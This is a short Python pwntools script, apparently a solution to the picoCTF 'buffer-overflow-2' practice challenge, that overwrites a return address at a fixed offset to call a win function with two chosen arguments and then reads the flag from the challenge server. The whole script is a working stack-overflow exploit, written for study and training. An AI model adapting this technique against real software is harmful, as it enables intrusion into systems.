# picoCTF-buffer-overflow-2-exploit.py
# by Aidan Wech (ahwech)
# nc saturn.picoctf.net xxxxx

from pwn import *

def main():
    # connection variables (remember to start up instance on picoCTF, port will vary!)
    host = "saturn.picoctf.net"
    port = 63695

    # variables
    offset = 112
    win_addr = 0x8049296
    arg1 = 0xcafef00d
    arg2 = 0xf00df00d
    payload = flat(
        {offset: p32(win_addr)},
        "AAAA",
        p32(arg1),
        p32(arg2)
    )

    # connect to instance and deliver payload
    p = remote(host, port)
    p.recvline(timeout=1)
    p.sendline(payload)
    p.recvline(timeout=1)
    flag = p.recv(timeout=1).decode()
    p.close()

    # print flag
    log.info(f"flag: {flag}")

if __name__ == "__main__":
    main()